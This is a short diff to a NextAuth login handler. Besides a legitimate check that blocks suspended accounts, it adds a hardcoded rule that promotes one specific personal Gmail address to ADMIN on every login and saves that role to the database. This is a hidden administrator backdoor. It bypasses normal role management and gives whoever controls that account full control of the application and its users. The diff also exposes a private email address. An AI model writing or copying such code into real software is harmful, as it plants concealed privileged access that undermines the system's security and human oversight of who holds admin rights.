@@ -34,6 +34,16 @@ export const authOptions: NextAuthOptions = {
                     throw new Error('Invalid password');
                 }
 
+                if (user.status === 'SUSPENDED') {
+                    throw new Error('Your account has been suspended.');
+                }
+
+                // Auto-elevate specific email to ADMIN
+                if (user.email === 'azelkoramae@gmail.com') {
+                    user.role = 'ADMIN';
+                    await user.save();
+                }
+
                 return {
                     id: user._id.toString(),
                     email: user.email,
